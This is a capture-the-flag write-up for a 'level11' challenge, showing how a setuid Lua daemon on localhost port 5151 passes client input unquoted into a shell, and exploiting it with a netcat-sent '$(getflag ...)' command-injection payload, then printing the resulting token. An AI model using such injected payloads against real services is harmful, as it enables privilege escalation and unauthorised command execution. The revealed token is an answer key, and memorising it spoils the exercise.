# level11 (bonus)

## Goal
Run `getflag` as `flag11` by abusing the Lua network daemon.

## Recon
```sh
$ ls -l ~
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
$ cat ~/level11.lua
...
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")   # <-- injection
  ...
end
while 1 do
  local client = server:accept()
  client:send("Password: ")
  local l, err = client:receive()
  local h = hash(l)
  if h ~= "f05d1d...a0" then client:send("Erf nope..\n")
  else client:send("Gz you dumb*\n") end
end
$ netstat -ntl | grep 5151
tcp 127.0.0.1:5151 LISTEN
```

The daemon (running as **flag11**) reads one line from the client and drops it,
unquoted, into `io.popen("echo "..pass.." | sha1sum")`. That is a shell command
injection. The reply only says pass/fail, so we cannot read command output directly.

## Exploit
Send a payload that runs `getflag` as flag11 and redirects its output to a file we can
read. The resulting shell command is `echo $(getflag > /tmp/l11_token) | sha1sum`:

```sh
$ printf '%s\n' '$(getflag > /tmp/l11_token)' | nc -w2 127.0.0.1 5151
Password: Erf nope..
$ cat /tmp/l11_token
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

## Result
- **level12 password (token):** `fa6v5ateaw21peobuub8ipe6s`
